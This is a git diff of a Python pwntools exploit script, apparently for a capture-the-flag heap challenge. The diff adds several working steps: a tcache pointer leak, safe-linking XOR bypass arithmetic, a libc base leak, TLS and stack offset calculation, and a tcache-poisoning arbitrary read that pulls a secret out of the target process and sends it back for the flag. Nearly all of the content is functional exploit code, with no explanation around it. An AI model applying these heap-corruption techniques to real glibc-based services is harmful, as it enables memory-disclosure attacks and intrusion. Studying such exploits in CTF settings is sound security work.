@@ -12,6 +12,12 @@ from functools import partial
 
 SCANF_INPUT_SIZE = 1024
 HEAP_FIRST_OFF   = 0xf30
+LIBC_LEAK_OFF    = 0xd40
+
+TLS_LIBC_MAP_OFF = 0x803000
+TLS_MAP_RSP_OFF  = 0x7fe700 
+
+SECRET_OFF = 0x1c0
 
 DATA_PREFIX = b"MESSAGE: "
 DATA_PREFIX_LEN = len(DATA_PREFIX)
@@ -24,16 +30,17 @@ proc, elf = (None, None)
 libc : p.ELF # f*cking LSP
 gdb_pid = 0
 pids = []
-
+idx = 0
 
 def get_server():
     global proc, elf, libc
 
     argv = (["sudo", "strace"] if args.strace else []) + [args.binary]
-    if args.noaslr:
-        proc = p.process(argv, setuid=False, aslr=False)
-    else:
-        proc = p.process(argv)
+    with open("/tmp/error.log", "wb") as log:
+        if args.noaslr:
+            proc = p.process(argv, setuid=False, aslr=False, stderr=log)
+        else:
+            proc = p.process(argv, stderr=log)
 
     elf  = p.ELF(args.binary) if args.strace else proc.elf
     libc = elf.libc
@@ -52,7 +59,7 @@ def attach_gdb(gdbscript="", pause=False):
 
     gdbscript = ("gef-init\n" if args.gef else "pwndbg-init\n") + gdbscript
     gdb_pid = p.gdb.attach(proc, gdbscript=gdbscript)
-    time.sleep(1)
+    time.sleep(0.1)
 
     if pause:
         input("Press any key to continue gdb... ")
@@ -76,10 +83,12 @@ class thread_comm(p.remote):
         if proc is None:
             print("!WARNING! Proc wasnt started.")
         super().__init__(host, port)
+
         self.own_payload = b""
         self.do_send = do_send
         self.alloc_blown = False
-        self.last_blown_idx = -1
+        self.tcache_leak = 0
+
         time.sleep(0.1)
 
 
@@ -98,14 +107,6 @@ class thread_comm(p.remote):
             self.sendline(cmd)
         else:
             self.own_payload += cmd + b' '
-
-
-    def set_blown_idx(self, idx):
-        self.last_blown_idx = idx
-
-
-    def get_available_idx(self):
-        return self.last_blown_idx + 1
 
 
     def quit(self):
@@ -137,8 +138,6 @@ class thread_comm(p.remote):
 
 
     def free(self, idx, check=True):
-        if check and idx <= self.last_blown_idx:
-            print("Careful! Using idx that maybe has corrupted metadata and cannot be freed")
         self.prompt_cmd(b"free", idx)
 
 
@@ -208,22 +207,30 @@ def tcache_leak(thd1: thread_comm, thd2: thread_comm):
 
 
 def get_tcache_leak(thd1, thd2):
-    tcache_addr = 0
     for _ in range(TRIES):
         tcache_addr = tcache_leak(thd1, thd2)
         if tcache_addr:
-            break
-        print("...")
-    return tcache_addr
+            print("Tcache leak:", hex(tcache_addr))
+            thd1.tcache_leak = tcache_addr
+            return tcache_addr
+
+        print("... ", end='')
+
+    raise ValueError("No tcache leak")
 
 
 def setup_custom_alloc(thd1, thd2, target_addr):
-    packed_addr = p.p64(target_addr)
-    cmped_addr  = packed_addr.split(b'\x00')[0].split()[0]
-    if len(cmped_addr) <= 1:
-        raise ValueError("Compared addr is too small")
+    global idx
 
-    idx = thd1.get_available_idx()
+    packed_addr = p.p64(target_addr)
+    cmped_addr  = packed_addr.split(b'\x00')[0]
+    whitespace_split = cmped_addr.split()
+    if len(whitespace_split):
+        cmped_addr = whitespace_split[0]
+
+    if len(cmped_addr) <= 1:
+        raise ValueError("Warning! Compared addr is too small")
+
     thd1.malloc(idx)
     thd1.malloc(idx+1)
     thd1.free(idx+1)
@@ -241,11 +248,11 @@ def setup_custom_alloc(thd1, thd2, target_addr):
         time.sleep(0.1)
         thd1.malloc(idx)
         data = thd1.printf(idx)
-        print(hex(to_addr(data)))
+        # print(hex(to_addr(data)))
 
         if data[:8] == cmped_addr:
             failed = False
-            thd2.quit()
+            # thd2.quit()
             break
 
     if failed:
@@ -259,9 +266,8 @@ def setup_custom_alloc(thd1, thd2, target_addr):
     # ''')
 
     thd1.malloc(idx+1)
-    thd1.set_blown_idx(idx+1)
-    thd1.alloc_blown = True
-    return idx+1
+    idx += 2
+    return idx-1
 
 
 # maybe check if target_addr is a mod of 16
@@ -275,6 +281,11 @@ def arbitrary_read(thd1, thd2, target_addr: int):
     return thd1.printf(idx)
 
 
+def get_allocatable_addr(thd1, thd2, addr):
+    tcache_xored_loc = get_tcache_leak(thd1, thd2)
+    return (tcache_xored_loc) ^ addr
+
+
 def leak_libc():
     thd1, thd2 = (None, None)
     libc_leak  = b""
@@ -283,11 +294,7 @@ def leak_libc():
         thd2 = thread_comm()
 
         tcache_xored_loc = get_tcache_leak(thd1, thd2)
-        if not tcache_xored_loc:
-            print(b"No tcache leak...")
-            return 
-
-        target_addr  = (tcache_xored_loc << 12) + 0xd40
+        target_addr  = (tcache_xored_loc << 12) + LIBC_LEAK_OFF
         target_xored = target_addr ^ tcache_xored_loc
         print("Target addr:", hex(target_addr))
         print("Target addr: (xored)", hex(target_xored))
@@ -306,12 +313,24 @@ def exploit():
     thd1, thd2, libc_leak = leak_libc()
     libc.address = libc_leak - libc.symbols['_IO_wfile_jumps']
     print("libc leak:", hex(libc_leak))
-    print("libc address", hex(libc.address))
+    print("libc address:", hex(libc.address))
+
+    tls_loc = libc.address - TLS_LIBC_MAP_OFF
+    rsp_val = tls_loc + TLS_MAP_RSP_OFF + SECRET_OFF
+    print("TLS Location:", hex(tls_loc))
+    print("RSP Value:", hex(rsp_val))
+
+    thd3 = thread_comm()
+    thd4 = thread_comm()
+    target_addr = get_allocatable_addr(thd3, thd4, rsp_val)
+    print("addr of secret: (xored)", hex(target_addr))
 
     attach_gdb(pause=True)
+    secret = arbitrary_read(thd3, thd4, target_addr)
+    print(secret)
 
-    # flag = thd1.send_flag(b'')
-    # print("FLAG:", flag)
+    flag = thd1.send_flag(secret)
+    print("FLAG:", flag)
 
 
 def main():
